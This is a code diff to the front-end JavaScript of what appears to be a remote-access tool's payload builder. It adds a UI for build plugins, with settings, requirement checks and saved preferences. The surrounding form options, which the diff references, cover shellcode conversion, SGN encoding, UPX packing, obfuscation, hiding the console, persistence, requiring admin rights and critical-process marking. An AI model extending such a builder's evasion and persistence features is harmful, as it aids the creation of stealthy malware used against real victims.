@@ -43,11 +43,15 @@ const startupNameMacosHint = document.getElementById("startup-name-macos-hint");
 const startupNameDefaultHint = document.getElementById("startup-name-default-hint");
 const startupNameError = document.getElementById("startup-name-error");
 const platformInputs = document.querySelectorAll('input[name="platform"]');
+const buildPluginsSection = document.getElementById("build-plugins-section");
+const buildPluginsList = document.getElementById("build-plugins-list");
+const buildPluginsCount = document.getElementById("build-plugins-count");
 
 let currentServerVersion = null;
 let currentUserRole = null;
 let currentUsername = null;
 let showAllBuilds = false;
+let buildPlugins = [];
 
 async function loadServerVersion() {
   try {
@@ -123,6 +127,296 @@ function updateWindowsSectionVisibility() {
   windowsSection.classList.toggle("hidden", !hasWindows);
 }
 
+function pluginSettingInputId(pluginId, key) {
+  return `build-plugin-${pluginId}-${key}`.replace(/[^A-Za-z0-9_-]/g, "-");
+}
+
+function buildPluginCurrentSettings(plugin) {
+  const settings = {};
+  for (const setting of plugin.build?.settings || []) {
+    const el = document.querySelector(`[data-build-plugin-id="${plugin.id}"][data-build-setting-key="${setting.key}"]`);
+    if (!el) continue;
+    if (setting.type === "boolean") settings[setting.key] = !!el.checked;
+    else if (setting.type === "number") settings[setting.key] = Number(el.value || setting.default || 0);
+    else settings[setting.key] = el.value;
+  }
+  return settings;
+}
+
+function collectBuildPluginSettings() {
+  const result = {};
+  for (const plugin of buildPlugins) {
+    const enabledEl = document.querySelector(`[data-build-plugin-enable="${plugin.id}"]`);
+    result[plugin.id] = {
+      enabled: enabledEl ? !!enabledEl.checked : plugin.build?.enabledByDefault !== false,
+      settings: buildPluginCurrentSettings(plugin),
+    };
+  }
+  return result;
+}
+
+function setBuildField(field, value) {
+  const fieldMap = {
+    useDonut: "#donut-mode",
+    useLinuxShellcode: "#linux-shellcode-mode",
+    shellcodeConsole: "#shellcode-console",
+    useSgn: "#sgn-mode",
+    enableUpx: 'input[name="enable-upx"]',
+    upxStripHeaders: 'input[name="upx-strip-headers"]',
+    obfuscate: 'input[name="obfuscate"]',
+    garbleLiterals: 'input[name="garble-literals"]',
+    garbleTiny: 'input[name="garble-tiny"]',
+    disableCgo: 'input[name="disable-cgo"]',
+    stripDebug: 'input[name="strip-debug"]',
+    noPrinting: 'input[name="no-printing"]',
+    enableWebrtc: 'input[name="enable-webrtc"]',
+    enableWinRE: 'input[name="enable-winre"]',
+    fetchPublicIP: 'input[name="fetch-public-ip"]',
+    enablePersistence: 'input[name="enable-persistence"]',
+    hideConsole: 'input[name="hide-console"]',
+    requireAdmin: 'input[name="require-admin"]',
+    criticalProcess: 'input[name="critical-process"]',
+    outputName: "#output-name",
+    outputExtension: "#output-extension",
+    sgnIterations: "#sgn-iterations",
+    sleepSeconds: "#sleep-seconds",
+  };
+  const selector = fieldMap[field] || `#${field}`;
+  const el = document.querySelector(selector);
+  if (!el) return;
+  if (el.type === "checkbox") el.checked = !!value;
+  else el.value = String(value ?? "");
+  el.dispatchEvent(new Event("change", { bubbles: true }));
+  el.dispatchEvent(new Event("input", { bubbles: true }));
+  if (field === "useDonut") applyDonutMode(!!value);
+  if (field === "useLinuxShellcode") applyLinuxShellcodeMode(!!value);
+  if (field === "useSgn") applySgnMode(!!value);
+}
+
+function getRequirementValue(req, plugin) {
+  if (req.field) {
+    const settings = collectFormSettings();
+    return req.field.split(".").reduce((cur, key) => cur && cur[key], settings);
+  }
+  if (req.pluginSetting) {
+    const settings = buildPluginCurrentSettings(plugin);
+    return req.pluginSetting.split(".").reduce((cur, key) => cur && cur[key], settings);
+  }
+  return undefined;
+}
+
+function buildRequirementMet(req, plugin) {
+  if (Array.isArray(req.platforms)) {
+    const selected = Array.from(document.querySelectorAll('input[name="platform"]:checked')).map((el) => el.value);
+    return req.platforms.some((platform) => selected.includes(platform));
+  }
+  const value = getRequirementValue(req, plugin);
+  if (req.truthy === true && !value) return false;
+  if (req.falsy === true && value) return false;
+  if (Object.prototype.hasOwnProperty.call(req, "equals") && value !== req.equals) return false;
+  if (Object.prototype.hasOwnProperty.call(req, "notEquals") && value === req.notEquals) return false;
+  if (Object.prototype.hasOwnProperty.call(req, "includes")) {
+    if (!Array.isArray(value) || !value.includes(req.includes)) return false;
+  }
+  return true;
+}
+
+function validateBuildPluginRequirements() {
+  const messages = [];
+  for (const plugin of buildPlugins) {
+    const enabled = document.querySelector(`[data-build-plugin-enable="${plugin.id}"]`)?.checked;
+    if (!enabled) continue;
+    for (const req of plugin.build?.requires || []) {
+      if (!buildRequirementMet(req, plugin)) {
+        messages.push(req.message || `${plugin.name} has unmet build requirements`);
+      }
+    }
+  }
+  return messages;
+}
+
+function renderBuildPluginSetting(plugin, setting) {
+  const id = pluginSettingInputId(plugin.id, setting.key);
+  const wrap = document.createElement("label");
+  wrap.className = "flex flex-col gap-1 text-sm";
+
+  const label = document.createElement("span");
+  label.className = "text-slate-300 font-medium";
+  label.textContent = setting.label || setting.key;
+  wrap.appendChild(label);
+
+  let input;
+  if (setting.type === "boolean") {
+    wrap.className = "flex items-center gap-2 text-sm text-slate-300";
+    input = document.createElement("input");
+    input.type = "checkbox";
+    input.checked = !!setting.default;
+    input.className = "w-4 h-4";
+    wrap.innerHTML = "";
+    wrap.appendChild(input);
+    wrap.appendChild(label);
+  } else if (setting.type === "select") {
+    input = document.createElement("select");
+    input.className = "w-full px-3 py-2 bg-slate-800/70 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-fuchsia-500 transition-colors";
+    for (const opt of setting.options || []) {
+      const option = document.createElement("option");
+      option.value = typeof opt === "string" ? opt : opt.value;
+      option.textContent = typeof opt === "string" ? opt : (opt.label || opt.value);
+      input.appendChild(option);
+    }
+    if (setting.default !== undefined) input.value = String(setting.default);
+    wrap.appendChild(input);
+  } else if (setting.type === "textarea") {
+    input = document.createElement("textarea");
+    input.rows = 3;
+    input.value = setting.default !== undefined ? String(setting.default) : "";
+    input.placeholder = setting.placeholder || "";
+    input.className = "w-full px-3 py-2 bg-slate-800/70 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-fuchsia-500 transition-colors";
+    wrap.appendChild(input);
+  } else {
+    input = document.createElement("input");
+    input.type = setting.type === "number" ? "number" : "text";
+    if (setting.min !== undefined) input.min = String(setting.min);
+    if (setting.max !== undefined) input.max = String(setting.max);
+    input.value = setting.default !== undefined ? String(setting.default) : "";
+    input.placeholder = setting.placeholder || "";
+    input.className = "w-full px-3 py-2 bg-slate-800/70 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-fuchsia-500 transition-colors";
+    wrap.appendChild(input);
+  }
+  input.id = id;
+  input.dataset.buildPluginId = plugin.id;
+  input.dataset.buildSettingKey = setting.key;
+  input.addEventListener("input", saveFormSettings);
+  input.addEventListener("change", saveFormSettings);
+
+  if (setting.description) {
+    const desc = document.createElement("span");
+    desc.className = "text-xs text-slate-500";
+    desc.textContent = setting.description;
+    wrap.appendChild(desc);
+  }
+  return wrap;
+}
+
+function renderBuildPlugins() {
+  if (!buildPluginsSection || !buildPluginsList) return;
+  buildPluginsList.innerHTML = "";
+  if (buildPlugins.length === 0) {
+    buildPluginsSection.classList.add("hidden");
+    return;
+  }
+  buildPluginsSection.classList.remove("hidden");
+  if (buildPluginsCount) buildPluginsCount.textContent = `${buildPlugins.length} available`;
+
+  for (const plugin of buildPlugins) {
+    const card = document.createElement("div");
+    card.className = "rounded-lg border border-slate-700 bg-slate-800/40 p-3 flex flex-col gap-3";
+
+    const top = document.createElement("div");
+    top.className = "flex items-start justify-between gap-3";
+    const title = document.createElement("div");
+    const nameEl = document.createElement("div");
+    nameEl.className = "font-medium text-slate-100";
+    nameEl.textContent = plugin.build?.label || plugin.name;
+    title.appendChild(nameEl);
+    if (plugin.build?.description) {
+      const desc = document.createElement("div");
+      desc.className = "text-xs text-slate-500 mt-1";
+      desc.textContent = plugin.build.description;
+      title.appendChild(desc);
+    }
+    const toggle = document.createElement("label");
+    toggle.className = "flex items-center gap-2 text-xs text-slate-300 cursor-pointer";
+    const cb = document.createElement("input");
+    cb.type = "checkbox";
+    cb.checked = plugin.build?.enabledByDefault !== false;
+    cb.dataset.buildPluginEnable = plugin.id;
+    cb.className = "w-4 h-4";
+    cb.addEventListener("change", saveFormSettings);
+    toggle.appendChild(cb);
+    toggle.appendChild(document.createTextNode("Enabled"));
+    top.appendChild(title);
+    top.appendChild(toggle);
+    card.appendChild(top);
+
+    if (plugin.build?.settings?.length) {
+      const grid = document.createElement("div");
+      grid.className = "grid grid-cols-1 md:grid-cols-2 gap-3";
+      for (const setting of plugin.build.settings) grid.appendChild(renderBuildPluginSetting(plugin, setting));
+      card.appendChild(grid);
+    }
+
+    if (plugin.build?.actions?.length) {
+      const actions = document.createElement("div");
+      actions.className = "flex flex-wrap gap-2";
+      for (const action of plugin.build.actions) {
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.className = "inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-fuchsia-700 hover:bg-fuchsia-600 text-white text-sm transition-colors";
+        const icon = document.createElement("i");
+        icon.className = action.icon || "fa-solid fa-wand-magic-sparkles";
+        const text = document.createElement("span");
+        text.textContent = action.label;
+        btn.appendChild(icon);
+        btn.appendChild(text);
+        if (action.description) btn.title = action.description;
+        btn.addEventListener("click", () => {
+          for (const req of action.requires || []) {
+            if (!buildRequirementMet(req, plugin)) {
+              alert(req.message || "This action requires other build settings first.");
+              return;
+            }
+          }
+          for (const [field, value] of Object.entries(action.setBuild || {})) setBuildField(field, value);
+          for (const [key, value] of Object.entries(action.setSettings || {})) {
+            const el = document.querySelector(`[data-build-plugin-id="${plugin.id}"][data-build-setting-key="${key}"]`);
+            if (!el) continue;
+            if (el.type === "checkbox") el.checked = !!value;
+            else el.value = String(value ?? "");
+            el.dispatchEvent(new Event("change", { bubbles: true }));
+          }
+          saveFormSettings();
+        });
+        actions.appendChild(btn);
+      }
+      card.appendChild(actions);
+    }
+    buildPluginsList.appendChild(card);
+  }
+}
+
+function applyBuildPluginSettings(settings) {
+  if (!settings || typeof settings !== "object") return;
+  for (const plugin of buildPlugins) {
+    const saved = settings[plugin.id];
+    if (!saved || typeof saved !== "object") continue;
+    const enabled = document.querySelector(`[data-build-plugin-enable="${plugin.id}"]`);
+    if (enabled && saved.enabled !== undefined) enabled.checked = !!saved.enabled;
+    for (const [key, value] of Object.entries(saved.settings || {})) {
+      const el = document.querySelector(`[data-build-plugin-id="${plugin.id}"][data-build-setting-key="${key}"]`);
+      if (!el) continue;
+      if (el.type === "checkbox") el.checked = !!value;
+      else el.value = String(value ?? "");
+    }
+  }
+}
+
+async function loadBuildPlugins() {
+  try {
+    const res = await fetch("/api/build/plugins", { credentials: "include" });
+    if (!res.ok) return;
+    const data = await res.json();
+    buildPlugins = Array.isArray(data.plugins) ? data.plugins : [];
+    renderBuildPlugins();
+    try {
+      const raw = localStorage.getItem(BUILD_SETTINGS_KEY);
+      if (raw) applyBuildPluginSettings(JSON.parse(raw).buildPlugins);
+    } catch {}
+  } catch (err) {
+    console.warn("Failed to load build plugins:", err);
+  }
+}
+
 const BUILD_SETTINGS_KEY = "overlord_build_settings";
 
 function collectFormSettings() {
@@ -169,6 +463,7 @@ function collectFormSettings() {
     shellcodeConsole: document.getElementById("shellcode-console")?.checked ?? false,
     useSgn: document.getElementById("sgn-mode")?.checked ?? false,
     sgnIterations: parseInt(document.getElementById("sgn-iterations")?.value, 10) || 1,
+    buildPlugins: collectBuildPluginSettings(),
   };
 }
 
@@ -247,6 +542,7 @@ function applyFormSettings(settings) {
     if (settings.useSgn) applySgnMode(true);
   }
   if (settings.sgnIterations !== undefined) setVal("sgn-iterations", settings.sgnIterations);
+  if (settings.buildPlugins !== undefined) applyBuildPluginSettings(settings.buildPlugins);
 
   const restoredObfuscate = document.querySelector('input[name="obfuscate"]');
   const garbleContainer = document.getElementById("garble-settings-container");
@@ -509,6 +805,7 @@ function applyLinuxShellcodeMode(enabled) {
 
 restoreFormSettings();
 initAccordions();
+loadBuildPlugins();
 updateWindowsSectionVisibility();
 updateShellcodeCheckboxVisibility();
 init();
@@ -1445,6 +1742,7 @@ form?.addEventListener("submit", async (e) => {
     sgnIterations: parseInt(document.getElementById("sgn-iterations")?.value, 10) || 1,
     outputSgnTxt: pendingSgnTxtBuild,
     uploadToFileShare: pendingUpload,
+    buildPlugins: collectBuildPluginSettings(),
   };
 
   const hasAndroid = platforms.some(p => p.startsWith('android-'));
@@ -1484,6 +1782,12 @@ form?.addEventListener("submit", async (e) => {
     )) {
       return;
     }
+  }
+
+  const pluginRequirementErrors = validateBuildPluginRequirements();
+  if (pluginRequirementErrors.length > 0) {
+    alert(`Build plugin requirements are not met:\n\n${pluginRequirementErrors.map((msg) => `- ${msg}`).join("\n")}`);
+    return;
   }
 
   await startBuild(buildConfig);
